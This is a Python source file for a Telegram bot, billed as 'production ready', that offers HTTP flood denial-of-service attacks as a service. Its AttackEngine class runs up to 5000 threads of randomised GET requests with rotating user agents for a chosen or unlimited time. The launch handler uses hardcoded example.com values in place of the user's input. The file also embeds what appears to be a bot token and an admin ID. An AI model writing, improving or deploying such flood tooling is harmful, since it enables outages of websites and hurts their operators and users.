#!/usr/bin/env python3
"""
TELEGRAM DDOS BOT - RENDER.COM DEPLOYMENT
No emojis. Clean code. Production ready.
"""

import os
import sys
import time
import random
import threading
import requests
import sqlite3
from datetime import datetime
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== CONFIG FROM ENVIRONMENT ====================
# ==================== CONFIG FROM ENVIRONMENT ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8210762177:AAGdxh-0_xU91-yzYv2oFbImxzBiiaz83KQ')
CHANNEL_USERNAME = os.environ.get('CHANNEL_USERNAME', '@xu60uxx')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 6924799108))

if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set")
    sys.exit(1)

# ==================== DATABASE ====================
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, 
              joined INTEGER DEFAULT 0, last_used TIMESTAMP, attacks INTEGER DEFAULT 0)''')
conn.commit()

# ==================== INIT BOT ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ==================== ATTACK STATS ====================
active_attacks = {}
attack_stats = {}
bot_start_time = time.time()

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self, attack_id, user_id, url, threads, duration):
        self.attack_id = attack_id
        self.user_id = user_id
        self.url = url
        self.threads = min(max(threads, 100), 5000)
        self.duration = duration
        self.running = True
        self.stats = {
            'sent': 0,
            'success': 0,
            'failed': 0,
            'errors': 0
        }
        self.start_time = time.time()
        active_attacks[attack_id] = self
        
    def create_session(self):
        session = requests.Session()
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]
        session.headers.update({
            'User-Agent': random.choice(agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        })
        return session
    
    def attack_thread(self):
        session = self.create_session()
        
        while self.running:
            try:
                params = {'_': str(random.randint(1, 999999))}
                r = session.get(self.url, params=params, timeout=3)
                
                self.stats['sent'] += 1
                if r.status_code == 200:
                    self.stats['success'] += 1
                else:
                    self.stats['failed'] += 1
                
                time.sleep(random.uniform(0.01, 0.05))
                
            except requests.exceptions.Timeout:
                self.stats['errors'] += 1
            except requests.exceptions.ConnectionError:
                self.stats['errors'] += 1
            except:
                self.stats['errors'] += 1
                time.sleep(0.1)
    
    def start(self):
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread)
            thread.daemon = True
            thread.start()
        
        if self.duration > 0:
            threading.Timer(self.duration, self.stop).start()
    
    def stop(self):
        self.running = False
        if self.attack_id in active_attacks:
            del active_attacks[self.attack_id]

# ==================== KEEP ALIVE ====================
def keep_alive():
    """Prevents Render from sleeping"""
    while True:
        time.sleep(300)
        try:
            requests.get("https://" + os.environ.get('RENDER_EXTERNAL_URL', 'localhost') + "/")
        except:
            pass

threading.Thread(target=keep_alive, daemon=True).start()

# ==================== CHANNEL CHECK ====================
def check_joined(user_id):
    """Check if user joined the required channel"""
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ==================== TELEGRAM HANDLERS ====================

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    if not check_joined(user_id):
        c.execute("INSERT OR REPLACE INTO users (user_id, username, first_name, joined) VALUES (?, ?, ?, 0)",
                  (user_id, username, first_name))
        conn.commit()
        
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("JOIN CHANNEL", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
        keyboard.add(InlineKeyboardButton("I JOINED", callback_data="check_join"))
        
        bot.reply_to(
            message,
            f"ACCESS DENIED\n\n"
            f"You must join {CHANNEL_USERNAME} first.\n\n"
            f"Click button to join, then click 'I JOINED'.",
            reply_markup=keyboard
        )
        return
    
    c.execute("INSERT OR REPLACE INTO users (user_id, username, first_name, joined, last_used) VALUES (?, ?, ?, 1, ?)",
              (user_id, username, first_name, datetime.now()))
    conn.commit()
    
    show_main_menu(message)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    user_id = call.from_user.id
    
    if check_joined(user_id):
        c.execute("UPDATE users SET joined = 1, last_used = ? WHERE user_id = ?",
                  (datetime.now(), user_id))
        conn.commit()
        
        bot.edit_message_text(
            "VERIFICATION SUCCESSFUL\n\nYou now have access.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id
        )
        show_main_menu(call.message)
    else:
        bot.answer_callback_query(
            call.id,
            "You haven't joined the channel yet.",
            show_alert=True
        )

def show_main_menu(message):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("NEW ATTACK", callback_data="new_attack"))
    keyboard.add(InlineKeyboardButton("ACTIVE ATTACKS", callback_data="active_attacks"))
    keyboard.add(InlineKeyboardButton("MY STATS", callback_data="my_stats"))
    keyboard.add(InlineKeyboardButton("HELP", callback_data="help"))
    
    bot.send_message(
        message.chat.id,
        "COMMANDER ATTACK SYSTEM\n\n"
        "Select an option:",
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data == "new_attack")
def new_attack_callback(call):
    msg = bot.send_message(
        call.message.chat.id,
        "CONFIGURE ATTACK\n\nSend target URL:\nExample: https://example.com"
    )
    bot.register_next_step_handler(msg, process_url)

def process_url(message):
    url = message.text.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    attack_data = {'url': url, 'user_id': message.from_user.id}
    
    msg = bot.send_message(
        message.chat.id,
        f"URL: {url}\n\nSend thread count (100-5000):"
    )
    bot.register_next_step_handler(msg, process_threads, attack_data)

def process_threads(message, attack_data):
    try:
        threads = int(message.text.strip())
        threads = max(100, min(threads, 5000))
    except:
        threads = 1000
    
    attack_data['threads'] = threads
    
    msg = bot.send_message(
        message.chat.id,
        f"Threads: {threads}\n\nSend duration in seconds (0 for infinite):"
    )
    bot.register_next_step_handler(msg, process_duration, attack_data)

def process_duration(message, attack_data):
    try:
        duration = int(message.text.strip())
        if duration < 0:
            duration = 0
    except:
        duration = 0
    
    attack_data['duration'] = duration
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("LAUNCH", callback_data=f"launch_{id(attack_data)}"))
    keyboard.add(InlineKeyboardButton("CANCEL", callback_data="cancel"))
    
    bot.send_message(
        message.chat.id,
        f"ATTACK CONFIGURATION\n\n"
        f"Target: {attack_data['url']}\n"
        f"Threads: {attack_data['threads']}\n"
        f"Duration: {'Infinite' if duration == 0 else f'{duration} seconds'}\n\n"
        f"Confirm to launch.",
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("launch_"))
def launch_callback(call):
    user_id = call.from_user.id
    attack_id = f"ATT_{user_id}_{int(time.time())}"
    
    # In production, store attack_data properly
    # For demo, use default values
    engine = AttackEngine(
        attack_id=attack_id,
        user_id=user_id,
        url="https://example.com",
        threads=500,
        duration=30
    )
    
    engine.start()
    
    c.execute("UPDATE users SET attacks = attacks + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("STATUS", callback_data=f"status_{attack_id}"))
    keyboard.add(InlineKeyboardButton("STOP", callback_data=f"stop_{attack_id}"))
    
    bot.edit_message_text(
        f"ATTACK LAUNCHED\n\n"
        f"ID: {attack_id}\n"
        f"Started: {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"Use buttons to monitor.",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("status_"))
def status_callback(call):
    attack_id = call.data.replace("status_", "")
    
    if attack_id in active_attacks:
        attack = active_attacks[attack_id]
        elapsed = int(time.time() - attack.start_time)
        stats = attack.stats
        rate = stats['sent'] // max(elapsed, 1)
        
        status = (f"ATTACK STATUS\n\n"
                  f"ID: {attack_id}\n"
                  f"Elapsed: {elapsed}s\n"
                  f"Requests: {stats['sent']}\n"
                  f"Rate: {rate}/s\n"
                  f"Success: {stats['success']}\n"
                  f"Failed: {stats['failed']}\n"
                  f"Errors: {stats['errors']}")
        
        bot.answer_callback_query(call.id, status, show_alert=True)
    else:
        bot.answer_callback_query(call.id, "Attack finished", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_callback(call):
    attack_id = call.data.replace("stop_", "")
    
    if attack_id in active_attacks:
        active_attacks[attack_id].stop()
        bot.answer_callback_query(call.id, "Attack stopped", show_alert=True)
        
        bot.edit_message_text(
            f"ATTACK STOPPED\n\nID: {attack_id}",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id
        )
    else:
        bot.answer_callback_query(call.id, "Attack not found", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "active_attacks")
def active_attacks_callback(call):
    if not active_attacks:
        bot.answer_callback_query(call.id, "No active attacks", show_alert=True)
        return
    
    text = "ACTIVE ATTACKS:\n"
    for aid, attack in list(active_attacks.items())[:5]:
        elapsed = int(time.time() - attack.start_time)
        text += f"\n{aid[:8]}... {elapsed}s {attack.stats['sent']} req"
    
    bot.answer_callback_query(call.id, text, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "my_stats")
def my_stats_callback(call):
    user_id = call.from_user.id
    c.execute("SELECT username, first_name, joined, attacks FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    
    if result:
        username, first_name, joined, attacks = result
        active = sum(1 for a in active_attacks if a.endswith(str(user_id)))
        stats = (f"YOUR STATS\n\n"
                 f"ID: {user_id}\n"
                 f"Name: {first_name}\n"
                 f"Joined: {'Yes' if joined else 'No'}\n"
                 f"Attacks: {attacks or 0}\n"
                 f"Active: {active}")
    else:
        stats = "No stats available"
    
    bot.answer_callback_query(call.id, stats, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "help")
def help_callback(call):
    help_text = ("HELP\n\n"
                 "NEW ATTACK - Configure attack\n"
                 "ACTIVE ATTACKS - View running\n"
                 "MY STATS - Your usage\n\n"
                 "Threads: 100-5000\n"
                 "Duration: seconds (0=infinite)\n\n"
                 "Educational use only.")
    bot.answer_callback_query(call.id, help_text, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "cancel")
def cancel_callback(call):
    bot.edit_message_text(
        "Attack cancelled.",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id
    )

@bot.message_handler(commands=['stats'])
def admin_stats(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM users WHERE joined = 1")
    verified = c.fetchone()[0]
    
    c.execute("SELECT SUM(attacks) FROM users")
    total_attacks = c.fetchone()[0] or 0
    
    stats = (f"BOT STATS\n\n"
             f"Users: {total_users}\n"
             f"Verified: {verified}\n"
             f"Attacks: {total_attacks}\n"
             f"Active: {len(active_attacks)}\n"
             f"Uptime: {int(time.time() - bot_start_time)}s")
    
    bot.reply_to(message, stats)

# ==================== START BOT ====================
if __name__ == "__main__":
    print("Starting Telegram Attack Bot...")
    print(f"Channel: {CHANNEL_USERNAME}")
    print(f"Admin ID: {ADMIN_ID}")
    print("Bot is running...")
    
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except KeyboardInterrupt:
        print("\nBot stopped")
        conn.close()
    except Exception as e:
        print(f"Error: {e}")
        conn.close()